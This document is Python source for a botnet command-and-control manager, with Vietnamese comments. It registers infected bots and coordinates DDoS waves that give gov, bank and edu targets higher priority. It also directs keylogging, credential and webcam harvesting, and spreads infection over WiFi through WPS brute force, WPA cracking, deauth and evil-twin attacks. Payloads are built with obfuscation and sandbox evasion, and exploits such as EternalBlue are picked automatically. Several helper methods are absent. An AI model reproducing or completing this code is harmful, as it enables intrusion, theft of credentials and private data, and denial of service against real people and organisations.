import threading
import queue
import json
import time
import logging
import asyncio
import aiohttp
import networkx as nx
from datetime import datetime
from typing import Dict, List, Set, Optional, Any, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
import random
from itertools import islice

# AI Imports
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.cluster import KMeans
from sklearn.preprocessing import StandardScaler
from sklearn.neural_network import MLPRegressor
from sklearn.decomposition import PCA
import joblib
import psutil

from payload.modules.keylogger import SmartKeylogger as Keylogger
from payload.modules.credential_harvester import CredentialHarvester
from payload.modules.data_harvester import DataHarvester
from payload.modules.screenshot import ScreenshotCapture
from payload.modules.webcam import WebcamCapture
from core.exploit_builder import ExploitBuilder, PayloadConfig
from network.network_discovery import NetworkDiscovery
from network.spreading import NetworkSpreader

@dataclass
class Bot:
    """Thông tin về một bot"""
    id: str
    ip: str
    hostname: Optional[str] = None
    os: Optional[str] = None
    arch: Optional[str] = None
    status: str = 'active'
    capabilities: Dict[str, bool] = field(default_factory=dict)
    tasks: List[Dict] = field(default_factory=list)
    last_seen: datetime = field(default_factory=datetime.now)
    score: int = 0
    tags: Set[str] = field(default_factory=set)

@dataclass
class Attack:
    """Thông tin về một cuộc tấn công"""
    id: str
    type: str
    target: str
    params: Dict
    bots: List[str]
    start_time: datetime
    duration: int
    status: str = 'running'
    stats: Dict = field(default_factory=dict)

class BotnetManager:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.bots: Dict[str, Bot] = {}
        self.tasks = queue.Queue()
        self.results = queue.Queue()
        self.attacks: Dict[str, Attack] = {}
        self.collections: Dict[str, Dict] = {}
        
        # Components
        self.exploit_builder = ExploitBuilder()
        self.network_discovery = NetworkDiscovery()
        self.network_spreader = NetworkSpreader(self.network_discovery)
        
        # Advanced task management
        self.task_priorities = defaultdict(int)
        self.bot_loads = defaultdict(int)
        self.bot_groups: Dict[str, Set[str]] = defaultdict(set)
        
        # Performance monitoring
        self.bot_metrics = defaultdict(lambda: {
            'success_rate': 0.0,
            'response_time': 0.0,
            'cpu_usage': 0.0,
            'memory_usage': 0.0
        })
        
        # Task executor pools
        self.executor = ThreadPoolExecutor(max_workers=20)
        self.async_executor = ThreadPoolExecutor(max_workers=10)
        self.running = True
        
        # Network analysis
        self.graph = nx.DiGraph()
        self.vulnerability_scores = defaultdict(float)
        
        # Task coordination
        self.coordinator_loop = asyncio.new_event_loop()
        self.session = aiohttp.ClientSession()
        
        # AI Components
        self.ai_task_allocator = None
        self.ai_performance_predictor = None
        self.ai_bot_clusterer = None
        self.ai_scaler = StandardScaler()
        self.ai_pca = PCA(n_components=10)
        self.task_history = []
        self.performance_history = []
        self.allocation_patterns = defaultdict(list)
        
        # Initialize AI models
        self._init_ai_models()
        
        # Start background tasks
        self._start_background_tasks()
        
    def _start_background_tasks(self):
        """Khởi động các background tasks"""
        threading.Thread(
            target=self._process_task_queue,
            daemon=True
        ).start()
        
        threading.Thread(
            target=self._monitor_attacks,
            daemon=True
        ).start()
        
        threading.Thread(
            target=self._update_network_topology,
            daemon=True
        ).start()
        
        # Start network discovery
        self.network_discovery.start_discovery()
        
    def register_bot(self, bot_id: str, info: Dict) -> None:
        """Đăng ký bot mới"""
        bot = Bot(
            id=bot_id,
            ip=info.get('ip', ''),
            hostname=info.get('hostname'),
            os=info.get('os'),
            arch=info.get('arch'),
            capabilities=self._detect_capabilities(info)
        )
        
        # Calculate initial score
        bot.score = self._calculate_bot_score(bot)
        
        # Add tags
        if info.get('os', '').startswith('Windows'):
            bot.tags.add('windows')
        elif info.get('os', '').startswith('Linux'):
            bot.tags.add('linux')
            
        if 'server' in info.get('os', '').lower():
            bot.tags.add('server')
            
        self.bots[bot_id] = bot
        self._update_graph_bot(bot)
        self.logger.info(f"Registered new bot: {bot_id}")
        
    def _detect_capabilities(self, info: Dict) -> Dict[str, bool]:
        """Phát hiện khả năng của bot"""
        os = info.get('os', '').lower()
        arch = info.get('arch', '').lower()
        hw_info = info.get('hardware', {})
        net_info = info.get('network', {})
        
        capabilities = {
            'ddos': True,  # Basic capability
            'harvest_data': True,  # Basic capability
            'spread': True,  # Basic capability
            
            # OS-specific capabilities
            'keylogging': 'windows' in os,
            'screenshot': 'windows' in os or 'linux' in os,
            'webcam': hw_info.get('webcam', False),
            
            # Architecture-specific
            'exploit_64bit': 'x64' in arch or 'amd64' in arch,
            'exploit_32bit': 'x86' in arch or 'i386' in arch,
            
            # Network capabilities
            'wifi_scan': net_info.get('wifi_adapter', False),
            'wifi_injection': net_info.get('wifi_monitor_mode', False),
            'wifi_deauth': net_info.get('wifi_injection', False),
            'wifi_mitm': net_info.get('wifi_injection', False),
            
            # Advanced capabilities
            'privilege_escalation': False,
            'lateral_movement': False,
            'persistence': False
        }
        
        return capabilities
        
    def _calculate_bot_score(self, bot: Bot) -> int:
        """Tính điểm cho bot"""
        score = 0
        
        # OS score
        if 'windows' in bot.tags:
            score += 30
        elif 'linux' in bot.tags:
            score += 25
            
        if 'server' in bot.tags:
            score += 20
            
        # Capability score  
        if bot.capabilities.get('privilege_escalation'):
            score += 15
        if bot.capabilities.get('lateral_movement'):
            score += 15
        if bot.capabilities.get('persistence'):
            score += 10
            
        # Activity score
        if len(bot.tasks) > 0:
            success_rate = len([t for t in bot.tasks if t.get('status') == 'completed']) / len(bot.tasks)
            score += int(success_rate * 10)
            
        return score
        
    def assign_task(self, bot_id: str, task_type: str, params: Optional[Dict] = None) -> bool:
        """Gán task cho bot với load balancing"""
        if bot_id not in self.bots:
            return False
            
        bot = self.bots[bot_id]
        
        # Verify capability và check load
        if task_type not in bot.capabilities:
            self.logger.warning(f"Bot {bot_id} does not support {task_type}")
            return False
            
        current_load = self.bot_loads[bot_id]
        if current_load > 5:  # Max 5 concurrent tasks
            # Try to find alternative bot
            alt_bot = self._find_alternative_bot(task_type)
            if alt_bot:
                return self.assign_task(alt_bot, task_type, params)
            return False
            
        # Create task with priority
        task = {
            'id': self._generate_id('task'),
            'type': task_type,
            'params': params or {},
            'status': 'pending',
            'timestamp': datetime.now(),
            'bot_id': bot_id,
            'priority': self._calculate_task_priority(task_type, params)
        }
        
        # Update loads and metrics
        self.bot_loads[bot_id] += 1
        bot.tasks.append(task)
        self.task_priorities[task['id']] = task['priority']
        
        # Add to priority queue
        self.tasks.put((task['priority'], task))
        
        self.logger.info(f"Assigned {task_type} task to bot {bot_id} with priority {task['priority']}")
        return True
        
    def _calculate_task_priority(self, task_type: str, params: Optional[Dict]) -> int:
        """Calculate task priority"""
        priority = 1
        
        # Critical tasks get highest priority
        if task_type in ['spread', 'exploit', 'privilege_escalation']:
            priority += 3
            
        # Attack tasks priority based on target value
        if task_type in ['ddos', 'flood']:
            target = params.get('target', '')
            if any(key in target for key in ['gov', 'edu', 'bank']):
                priority += 2
                
        # Data collection priority based on data type
        if task_type in ['harvest_data', 'keylogging']:
            data_type = params.get('data_type', '')
            if data_type in ['credentials', 'financial']:
                priority += 2
                
        return priority
        
    def _find_alternative_bot(self, task_type: str) -> Optional[str]:
        """Find alternative bot for task"""
        candidates = []
        for bot_id, bot in self.bots.items():
            if (bot.capabilities.get(task_type) and
                bot.status == 'active' and
                self.bot_loads[bot_id] < 5):
                score = self.bot_metrics[bot_id]['success_rate'] * 100
                score -= self.bot_loads[bot_id] * 10
                candidates.append((bot_id, score))
                
        if candidates:
            return max(candidates, key=lambda x: x[1])[0]
        return None
        
    async def start_wifi_spread(self, bot_id: str, params: Dict) -> str:
        """Bắt đầu chiến dịch lây lan qua WiFi"""
        if not self.bots[bot_id].capabilities['wifi_scan']:
            raise ValueError("Bot không có khả năng quét WiFi")
            
        campaign_id = self._generate_id('wifi')
        
        # Thiết lập chiến dịch lây lan
        campaign = {
            'id': campaign_id,
            'bot_id': bot_id,
            'start_time': datetime.now(),
            'status': 'running',
            'networks': [],
            'infections': []
        }
        
        # Bắt đầu quét và tấn công mạng WiFi
        asyncio.create_task(self._execute_wifi_campaign(campaign))
        
        return campaign_id
        
    async def _execute_wifi_campaign(self, campaign: Dict) -> None:
        """Thực thi chiến dịch lây lan WiFi"""
        bot = self.bots[campaign['bot_id']]
        
        try:
            # 1. Quét tìm mạng WiFi
            networks = await self._scan_wifi_networks(bot)
            campaign['networks'] = networks
            
            # 2. Phân tích và xếp hạng mục tiêu
            targets = self._analyze_wifi_targets(networks)
            
            # 3. Tấn công từng mục tiêu
            for target in targets:
                if not campaign['status'] == 'running':
                    break
                    
                # Thử các phương pháp khác nhau
                if await self._attack_wps(bot, target):
                    continue
                    
                if await self._attack_wpa(bot, target):
                    continue
                    
                await self._attack_clients(bot, target)
                
        except Exception as e:
            self.logger.error(f"WiFi campaign error: {str(e)}")
            campaign['status'] = 'failed'
            
    async def _scan_wifi_networks(self, bot: Bot) -> List[Dict]:
        """Quét các mạng WiFi"""
        networks = []
        
        try:
            # Quét trên tất cả channels
            for channel in range(1, 14):
                await self._set_channel(bot, channel)
                
                # Thu thập thông tin mạng
                beacons = await self._capture_beacons(bot)
                for beacon in beacons:
                    network = {
                        'ssid': beacon['ssid'],
                        'bssid': beacon['bssid'],
                        'channel': channel,
                        'security': beacon['security'],
                        'signal': beacon['signal'],
                        'clients': [],
                        'wps': False
                    }
                    
                    # Kiểm tra WPS
                    if await self._check_wps(bot, network):
                        network['wps'] = True
                        
                    # Thu thập client
                    network['clients'] = await self._capture_clients(bot, network)
                    
                    networks.append(network)
                    
            return networks
            
        except Exception as e:
            self.logger.error(f"WiFi scanning error: {str(e)}")
            return networks
            
    def _analyze_wifi_targets(self, networks: List[Dict]) -> List[Dict]:
        """Phân tích và xếp hạng mục tiêu WiFi"""
        scored_targets = []
        
        for net in networks:
            score = 0
            
            # WPS được bật
            if net['wps']:
                score += 30
                
            # Có clients đang kết nối
            score += len(net['clients']) * 5
            
            # Cường độ tín hiệu tốt
            signal = net.get('signal', -100)
            if signal > -50:
                score += 20
            elif signal > -70:
                score += 10
                
            # Bảo mật yếu
            security = net.get('security', '')
            if 'wep' in security.lower():
                score += 40
            elif 'wpa' in security.lower():
                score += 20
                
            scored_targets.append((net, score))
            
        # Sắp xếp theo điểm
        scored_targets.sort(key=lambda x: x[1], reverse=True)
        return [t[0] for t in scored_targets]
        
    async def _attack_wps(self, bot: Bot, network: Dict) -> bool:
        """Tấn công WPS"""
        if not network['wps']:
            return False
            
        try:
            # Bắt đầu tấn công WPS
            pixie_dust = await self._try_pixie_dust(bot, network)
            if pixie_dust:
                await self._connect_wps(bot, network, pixie_dust)
                await self._install_payload(bot, network)
                return True
                
            # Thử bruteforce PIN
            pin = await self._bruteforce_wps(bot, network)
            if pin:
                await self._connect_wps(bot, network, pin)
                await self._install_payload(bot, network)
                return True
                
        except Exception as e:
            self.logger.error(f"WPS attack error: {str(e)}")
            
        return False
        
    async def _attack_wpa(self, bot: Bot, network: Dict) -> bool:
        """Tấn công WPA/WPA2"""
        try:
            # Thu thập handshake
            handshake = await self._capture_handshake(bot, network)
            if not handshake:
                return False
                
            # Thử crack password
            password = await self._crack_handshake(handshake)
            if password:
                await self._connect_network(bot, network, password)
                await self._install_payload(bot, network)
                return True
                
        except Exception as e:
            self.logger.error(f"WPA attack error: {str(e)}")
            
        return False
        
    async def _attack_clients(self, bot: Bot, network: Dict) -> bool:
        """Tấn công client"""
        if not bot.capabilities['wifi_deauth']:
            return False
            
        try:
            # Deauth clients
            await self._deauth_clients(bot, network)
            
            # Setup evil twin
            if bot.capabilities['wifi_mitm']:
                await self._setup_evil_twin(bot, network)
                
                # Thu thập credentials
                creds = await self._capture_creds(bot)
                if creds:
                    # Lây nhiễm client
                    await self._infect_clients(bot, network, creds)
                    return True
                    
        except Exception as e:
            self.logger.error(f"Client attack error: {str(e)}")
            
        return False

    async def start_attack(self, attack_type: str, target: str, params: Dict) -> str:
        """Bắt đầu một cuộc tấn công phân tán"""
        attack_id = self._generate_id('attack')
        
        # Analyze target và select optimal bots
        target_score = await self._analyze_target(target)
        required_bots = self._calculate_required_bots(target_score)
        
        capable_bots = self._select_attack_bots(attack_type, required_bots)
        if not capable_bots:
            raise ValueError(f"Insufficient bots for {attack_type} attack")
            
        # Create attack with coordination strategy
        attack = Attack(
            id=attack_id,
            type=attack_type,
            target=target,
            params=params,
            bots=capable_bots,
            start_time=datetime.now(),
            duration=params.get('duration', 3600),
            coordination={
                'waves': self._generate_attack_waves(len(capable_bots)),
                'rotation_interval': params.get('rotation', 300),
                'fallback_targets': self._get_fallback_targets(target)
            }
        )
        
        self.attacks[attack_id] = attack
        
        # Group bots for coordinated attack
        bot_groups = self._create_bot_groups(capable_bots, attack.coordination['waves'])
        for group_id, group_bots in bot_groups.items():
            self.bot_groups[f"{attack_id}_{group_id}"] = set(group_bots)
            
        # Start attack coordination
        asyncio.run_coroutine_threadsafe(
            self._coordinate_attack(attack_id),
            self.coordinator_loop
        )
        
        self.logger.info(
            f"Started coordinated {attack_type} attack {attack_id} with {len(capable_bots)} bots"
        )
        return attack_id
        
    def start_data_collection(self, collection_type: str, targets: List[str]) -> str:
        """Bắt đầu thu thập dữ liệu"""
        collection_id = self._generate_id('collection')
        
        # Select capable bots
        capable_bots = [
            bot_id for bot_id, bot in self.bots.items()
            if bot.capabilities.get(collection_type) and bot.status == 'active'
        ]
        
        if not capable_bots:
            raise ValueError(f"No bots capable of {collection_type} collection")
            
        # Create collection
        self.collections[collection_id] = {
            'id': collection_id,
            'type': collection_type,
            'targets': targets,
            'bots': capable_bots,
            'start_time': datetime.now(),
            'status': 'running',
            'data': []
        }
        
        # Assign tasks
        for bot_id in capable_bots:
            self.assign_task(bot_id, collection_type, {
                'collection_id': collection_id,
                'targets': targets
            })
            
        self.logger.info(
            f"Started {collection_type} collection {collection_id} with {len(capable_bots)} bots"
        )
        return collection_id
        
    def process_result(self, bot_id: str, task_id: str, result: Dict) -> None:
        """Xử lý kết quả từ bot"""
        if bot_id not in self.bots:
            return
            
        bot = self.bots[bot_id]
        
        # Update task status
        for task in bot.tasks:
            if task['id'] == task_id:
                task['status'] = 'completed'
                task['result'] = result
                task['completion_time'] = datetime.now()
                break
                
        # Process by type
        if result.get('type') in ['ddos', 'flood']:
            self._process_attack_result(bot_id, result)
        elif result.get('type') in ['harvest_data', 'keylogging', 'screenshot']:
            self._process_collection_result(bot_id, result)
            
        # Update bot score
        bot.score = self._calculate_bot_score(bot)
        
        # Add to results queue for GUI
        self.results.put((bot_id, task_id, result))
        
    def _process_attack_result(self, bot_id: str, result: Dict) -> None:
        """Process attack result"""
        attack_id = result.get('attack_id')
        if attack_id not in self.attacks:
            return
            
        attack = self.attacks[attack_id]
        
        # Update statistics
        if 'stats' not in attack.stats:
            attack.stats = {
                'requests_sent': 0,
                'bytes_sent': 0,
                'success_rate': 0,
                'bot_stats': {}
            }
            
        stats = attack.stats
        stats['requests_sent'] += result.get('requests_sent', 0)
        stats['bytes_sent'] += result.get('bytes_sent', 0)
        
        # Track per-bot stats
        stats['bot_stats'][bot_id] = {
            'requests': result.get('requests_sent', 0),
            'bytes': result.get('bytes_sent', 0),
            'success_rate': result.get('success_rate', 0)
        }
        
        # Update overall success rate
        bot_rates = [s['success_rate'] for s in stats['bot_stats'].values()]
        stats['success_rate'] = sum(bot_rates) / len(bot_rates)
        
    def _process_collection_result(self, bot_id: str, result: Dict) -> None:
        """Process data collection result"""
        collection_id = result.get('collection_id')
        if collection_id not in self.collections:
            return
            
        collection = self.collections[collection_id]
        
        # Add data
        if 'data' in result:
            collection['data'].append({
                'bot_id': bot_id,
                'timestamp': datetime.now(),
                'data': result['data']
            })
            
        # Check completion
        if result.get('status') == 'completed':
            collection['bot_status'][bot_id] = 'completed'
            if all(s == 'completed' for s in collection['bot_status'].values()):
                collection['status'] = 'completed'
                collection['end_time'] = datetime.now()
                
    def _process_task_queue(self) -> None:
        """Process task queue with priority"""
        while self.running:
            try:
                # Get highest priority tasks
                tasks = []
                with self.tasks.mutex:
                    tasks = sorted(self.tasks.queue, key=lambda x: x[0], reverse=True)
                    tasks = list(islice(tasks, 10))  # Process top 10
                    
                for priority, task in tasks:
                    bot_id = task['bot_id']
                    if bot_id in self.bots and self.bots[bot_id].status == 'active':
                        # Check bot health
                        if self._check_bot_health(bot_id):
                            self.executor.submit(self._execute_task, task)
                        else:
                            # Reassign to healthy bot
                            alt_bot = self._find_alternative_bot(task['type'])
                            if alt_bot:
                                task['bot_id'] = alt_bot
                                self.tasks.put((priority, task))
                                
            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Task processing error: {str(e)}")
                
    def _check_bot_health(self, bot_id: str) -> bool:
        """Check bot health metrics"""
        metrics = self.bot_metrics[bot_id]
        return (metrics['success_rate'] >= 0.7 and
                metrics['cpu_usage'] < 90 and
                metrics['memory_usage'] < 90)
                
    async def _analyze_target(self, target: str) -> float:
        """Analyze attack target and calculate vulnerability score"""
        try:
            # Kiểm tra các ports phổ biến
            open_ports = await self._scan_target_ports(target)
            
            # Tìm kiếm các dịch vụ dễ bị tấn công
            services = await self._identify_services(target, open_ports)
            
            # Phân tích các headers bảo mật
            security_score = await self._analyze_security_headers(target)
            
            # Tìm các paths có thể tấn công
            vuln_paths = await self._discover_vulnerable_paths(target)
            
            # Tính toán điểm dễ bị tấn công tổng hợp
            score = 1.0
            score += len(open_ports) * 0.1
            score += len(services) * 0.2
            score += security_score
            score += len(vuln_paths) * 0.3
            
            # Lưu kết quả phân tích
            self.vulnerability_scores[target] = score
            return score
            
        except Exception as e:
            self.logger.error(f"Target analysis error: {str(e)}")
            return 1.0
            
    async def _scan_target_ports(self, target: str) -> Set[int]:
        """Scan target ports"""
        common_ports = {80, 443, 21, 22, 23, 25, 53, 110, 143, 3306, 3389}
        open_ports = set()
        
        for port in common_ports:
            try:
                reader, writer = await asyncio.open_connection(target, port)
                writer.close()
                await writer.wait_closed()
                open_ports.add(port)
            except:
                continue
                
        return open_ports
        
    async def _identify_services(self, target: str, ports: Set[int]) -> Dict[int, str]:
        """Identify running services on ports"""
        services = {}
        for port in ports:
            try:
                reader, writer = await asyncio.open_connection(target, port)
                writer.write(b'HEAD / HTTP/1.0\r\n\r\n')
                await writer.drain()
                
                response = await reader.read(1024)
                if response:
                    services[port] = self._parse_service_banner(response)
                    
                writer.close()
                await writer.wait_closed()
            except:
                continue
                
        return services
        
    def _parse_service_banner(self, banner: bytes) -> str:
        """Parse service identification banner"""
        try:
            return banner.decode().split('\n')[0].strip()
        except:
            return 'unknown'
            
    async def _analyze_security_headers(self, target: str) -> float:
        """Analyze security headers"""
        try:
            async with self.session.get(f'http://{target}') as response:
                headers = dict(response.headers)
                security_headers = {
                    'X-Frame-Options',
                    'X-XSS-Protection',
                    'X-Content-Type-Options',
                    'Strict-Transport-Security',
                    'Content-Security-Policy'
                }
                
                missing = security_headers - set(headers.keys())
                return len(missing) * 0.2
                
        except Exception:
            return 1.0
            
    async def _discover_vulnerable_paths(self, target: str) -> Set[str]:
        """Find potentially vulnerable paths"""
        common_paths = {
            '/admin', '/login', '/wp-admin',
            '/phpinfo.php', '/test.php',
            '/backup', '/config', '/old',
            '/.git', '/.env'
        }
        
        vulnerable = set()
        async with aiohttp.ClientSession() as session:
            for path in common_paths:
                try:
                    url = f'http://{target}{path}'
                    async with session.get(url) as response:
                        if response.status != 404:
                            vulnerable.add(path)
                except:
                    continue
                    
        return vulnerable
        
    def _execute_task(self, task: Dict) -> None:
        """Execute a task with advanced capabilities"""
        try:
            bot_id = task['bot_id']
            task_type = task['type']
            bot = self.bots[bot_id]
            start_time = time.time()
            
            # Build specialized payload
            if task_type in ['spread', 'exploit']:
                config = PayloadConfig(
                    target_os=bot.os,
                    arch=bot.arch,
                    format='exe' if 'windows' in bot.tags else 'elf',
                    encryption=True,
                    obfuscation=True,
                    sandbox_evasion=True
                )
                
                # Select best exploit
                exploit = self._select_best_exploit(task['params'].get('target'))
                result = self.exploit_builder.build_exploit(exploit, config)
                
                if not result.success:
                    raise Exception(f"Payload build failed: {result.error}")
                    
                task['params']['payload'] = result.files
                task['params']['exploit'] = exploit
                
            # Execute with monitoring
            # TODO: Implement actual task execution
            response_time = time.time() - start_time
            
            # Update bot metrics
            self.bot_metrics[bot_id]['response_time'] = response_time
            self._update_bot_metrics(bot_id, task)
            
        except Exception as e:
            self.logger.error(f"Task execution error: {str(e)}")
            task['status'] = 'failed'
            task['error'] = str(e)
            
            # Update failure metrics
            self._update_bot_metrics(bot_id, task, failed=True)
            
    def _select_best_exploit(self, target: str) -> str:
        """Select best exploit based on target analysis"""
        # Default exploit
        default = 'windows/service_exe'
        
        if not target:
            return default
            
        # Check vulnerability scores
        if target in self.vulnerability_scores:
            score = self.vulnerability_scores[target]
            
            if score > 1.5:
                return 'windows/smb/eternal_blue'
            elif score > 1.2:
                return 'linux/samba/is_known_pipename'
                
        return default
        
    def _update_bot_metrics(self, bot_id: str, task: Dict, failed: bool = False) -> None:
        """Update bot performance metrics"""
        metrics = self.bot_metrics[bot_id]
        
        # Update success rate
        total_tasks = len(self.bots[bot_id].tasks)
        successful = len([t for t in self.bots[bot_id].tasks if t.get('status') == 'completed'])
        metrics['success_rate'] = successful / total_tasks if total_tasks > 0 else 0
        
        # Update response time average
        if 'response_time' in task:
            old_avg = metrics['response_time']
            metrics['response_time'] = (old_avg * (total_tasks - 1) + task['response_time']) / total_tasks
            
        # Reduce load after task completion
        self.bot_loads[bot_id] = max(0, self.bot_loads[bot_id] - 1)
            
    async def _create_attack_pattern(self, attack: Attack) -> Dict:
        """Create advanced attack pattern"""
        pattern = {
            'rotations': [],  # List of bot rotations
            'intervals': [],  # Time intervals between waves
            'intensities': [],  # Attack intensity for each wave
            'fallbacks': []  # Fallback targets if primary fails
        }
        
        try:
            # Analyze target capacity
            target_info = await self._analyze_target_capacity(attack.target)
            
            # Calculate optimal wave sizes
            wave_count = min(5, len(attack.bots) // 3)
            bots_per_wave = len(attack.bots) // wave_count
            
            # Create bot rotations for each wave
            remaining_bots = set(attack.bots)
            for _ in range(wave_count):
                wave_bots = self._select_wave_bots(remaining_bots, bots_per_wave)
                pattern['rotations'].append(list(wave_bots))
                remaining_bots -= wave_bots
                
            # Calculate intervals based on target's response time
            base_interval = max(30, target_info['response_time'] * 2)
            pattern['intervals'] = [
                base_interval * (i + 1) for i in range(wave_count)
            ]
            
            # Set wave intensities based on target capacity
            base_intensity = min(1.0, target_info['capacity'] / 100)
            pattern['intensities'] = [
                min(1.0, base_intensity * (1.2 ** i))
                for i in range(wave_count)
            ]
            
            # Generate fallback targets
            pattern['fallbacks'] = await self._generate_fallback_chain(attack.target)
            
            return pattern
            
        except Exception as e:
            self.logger.error(f"Error creating attack pattern: {str(e)}")
            return pattern
            
    def _select_wave_bots(self, available_bots: Set[str], count: int) -> Set[str]:
        """Select optimal bots for attack wave"""
        scored_bots = []
        for bot_id in available_bots:
            score = 0
            # Performance score
            score += self.bot_metrics[bot_id]['success_rate'] * 50
            score += (1 - self.bot_metrics[bot_id]['response_time'] / 1000) * 20
            
            # Resource score
            score += (100 - self.bot_metrics[bot_id]['cpu_usage']) * 0.2
            score += (100 - self.bot_metrics[bot_id]['memory_usage']) * 0.1
            
            # Capability score
            bot = self.bots[bot_id]
            if bot.capabilities.get('privilege_escalation'):
                score += 10
            if bot.capabilities.get('persistence'):
                score += 10
                
            scored_bots.append((bot_id, score))
            
        # Select top scoring bots
        scored_bots.sort(key=lambda x: x[1], reverse=True)
        return {b[0] for b in scored_bots[:count]}
        
    async def _analyze_target_capacity(self, target: str) -> Dict:
        """Analyze target's capacity to handle requests"""
        info = {
            'response_time': 500,  # Default 500ms
            'capacity': 50  # Default 50 req/sec
        }
        
        try:
            # Test response times
            times = []
            async with aiohttp.ClientSession() as session:
                for _ in range(10):
                    start = time.time()
                    async with session.get(f'http://{target}') as response:
                        await response.text()
                        times.append((time.time() - start) * 1000)
                        
            # Calculate metrics
            info['response_time'] = sum(times) / len(times)
            info['capacity'] = 1000 / max(times)  # Reqs per second
            
            return info
            
        except Exception as e:
            self.logger.error(f"Error analyzing target capacity: {str(e)}")
            return info
            
    def _monitor_attacks(self) -> None:
        """Monitor and coordinate ongoing attacks"""
        while self.running:
            try:
                current_time = datetime.now()
                
                for attack in list(self.attacks.values()):
                    # Check attack status
                    attack_time = (current_time - attack.start_time).total_seconds()
                    
                    if attack_time >= attack.duration:
                        self._complete_attack(attack)
                        continue
                        
                    if attack.status == 'completed':
                        if attack_time >= 3600:
                            del self.attacks[attack.id]
                        continue
                        
                    # Monitor and adjust attack
                    self._monitor_attack_progress(attack)
                    
                    # Adapt attack parameters if needed
                    if attack_time % 60 == 0:  # Every minute
                        self._adapt_attack_params(attack)
                        
                time.sleep(10)
                
            except Exception as e:
                self.logger.error(f"Attack monitoring error: {str(e)}")
                
    def _monitor_attack_progress(self, attack: Attack) -> None:
        """Monitor attack progress and make adjustments"""
        try:
            # Calculate current effectiveness
            stats = attack.stats.get('bot_stats', {})
            if not stats:
                return
                
            success_rates = []
            response_times = []
            
            for bot_id, bot_stats in stats.items():
                if bot_id in self.bots:
                    success_rates.append(bot_stats.get('success_rate', 0))
                    response_times.append(
                        self.bot_metrics[bot_id]['response_time']
                    )
                    
            avg_success = sum(success_rates) / len(success_rates)
            avg_response = sum(response_times) / len(response_times)
            
            # Check if adjustments needed
            if avg_success < 0.5 or avg_response > 1000:
                self._adjust_attack_strategy(attack)
                
        except Exception as e:
            self.logger.error(f"Error monitoring attack: {str(e)}")
                
    def _update_network_topology(self) -> None:
        """Update network topology graph"""
        while self.running:
            try:
                # Get latest network data
                network_data = self.network_discovery.get_network_map()
                
                # Update graph
                self.graph.clear()
                
                # Add subnet nodes
                for subnet, hosts in network_data['subnets'].items():
                    self.graph.add_node(subnet, type='subnet')
                    
                # Add host nodes
                for ip, host in network_data['hosts'].items():
                    self.graph.add_node(ip, type='host', data=host)
                    
                    # Connect to subnet
                    for subnet in network_data['subnets']:
                        if ip in network_data['subnets'][subnet]:
                            self.graph.add_edge(subnet, ip)
                            
                # Add bot nodes
                for bot in self.bots.values():
                    self.graph.add_node(bot.id, type='bot', data=bot)
                    if bot.ip in self.graph:
                        self.graph.add_edge(bot.id, bot.ip)
                        
                time.sleep(60)
                
            except Exception as e:
                self.logger.error(f"Topology update error: {str(e)}")
                
    def _update_graph_bot(self, bot: Bot) -> None:
        """Update bot node in graph"""
        self.graph.add_node(
            bot.id,
            type='bot',
            data=bot
        )
        if bot.ip:
            self.graph.add_edge(bot.id, bot.ip)
            
    def _generate_id(self, prefix: str) -> str:
        """Generate unique ID"""
        import uuid
        return f"{prefix}_{uuid.uuid4().hex[:8]}"
        
    def get_network_status(self) -> Dict:
        """Get network status overview"""
        active_bots = len([b for b in self.bots.values() if b.status == 'active'])
        
        return {
            'total_bots': len(self.bots),
            'active_bots': active_bots,
            'ongoing_attacks': len([a for a in self.attacks.values() if a.status == 'running']),
            'data_collections': len([c for c in self.collections.values() if c['status'] == 'running']),
            'network_coverage': len(self.graph.nodes()),
            'top_bots': sorted(
                [b for b in self.bots.values()],
                key=lambda x: x.score,
                reverse=True
            )[:5]
        }
        
    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """Get attack status"""
        if attack_id not in self.attacks:
            return None
            
        attack = self.attacks[attack_id]
        return {
            'id': attack.id,
            'type': attack.type,
            'target': attack.target,
            'status': attack.status,
            'start_time': attack.start_time.isoformat(),
            'duration': attack.duration,
            'active_bots': len([b for b in attack.bots if self.bots[b].status == 'active']),
            'stats': attack.stats
        }
        
    def get_collection_status(self, collection_id: str) -> Optional[Dict]:
        """Get collection status"""
        if collection_id not in self.collections:
            return None
            
        collection = self.collections[collection_id]
        return {
            'id': collection['id'],
            'type': collection['type'],
            'status': collection['status'],
            'start_time': collection['start_time'].isoformat(),
            'end_time': collection.get('end_time', '').isoformat() if collection.get('end_time') else None,
            'bots': len(collection['bots']),
            'data_points': len(collection['data'])
        }
        
    def get_bot_info(self, bot_id: str) -> Optional[Dict]:
        """Get detailed bot info"""
        if bot_id not in self.bots:
            return None
            
        bot = self.bots[bot_id]
        return {
            'id': bot.id,
            'ip': bot.ip,
            'hostname': bot.hostname,
            'os': bot.os,
            'arch': bot.arch,
            'status': bot.status,
            'capabilities': bot.capabilities,
            'score': bot.score,
            'tags': list(bot.tags),
            'tasks': len(bot.tasks),
            'last_seen': bot.last_seen.isoformat()
        }
        
    def get_network_graph(self) -> Dict:
        """Get network topology graph"""
        return nx.node_link_data(self.graph)
        
    async def _build_advanced_payload(self, bot: Bot, network: Dict) -> bytes:
        """Build advanced payload for WiFi infection"""
        try:
            config = PayloadConfig(
                network_info={
                    'ssid': network['ssid'],
                    'bssid': network['bssid'],
                    'security': network.get('security', ''),
                    'channel': network.get('channel', 1)
                },
                features={
                    'persistence': True,
                    'anti_detect': True,
                    'self_spread': True,
                    'wifi_scan': True
                },
                capabilities=bot.capabilities
            )
            
            result = await self.exploit_builder.build_wifi_payload(config)
            if not result.success:
                raise Exception(f"Payload build failed: {result.error}")
                
            return result.payload
            
        except Exception as e:
            self.logger.error(f"Advanced payload build error: {str(e)}")
            return b''

    async def _propagate_wifi(self, bot: Bot, network: Dict) -> None:
        """Advanced WiFi propagation"""
        try:
            # 1. Passive scanning mode
            await self._enable_monitor_mode(bot, network['channel'])
            
            # 2. Classify clients
            clients = await self._analyze_network_clients(bot, network)
            
            # 3. Multi-vector attack
            for client in clients:
                if client['risk_score'] >= 0.7:  # High value targets
                    await self._attack_client_chain([
                        self._deauth_client,
                        self._wait_reconnect,
                        self._intercept_traffic,
                        self._inject_payload,
                        self._verify_infection
                    ], bot, network, client)
                    
        except Exception as e:
            self.logger.error(f"WiFi propagation error: {str(e)}")
            
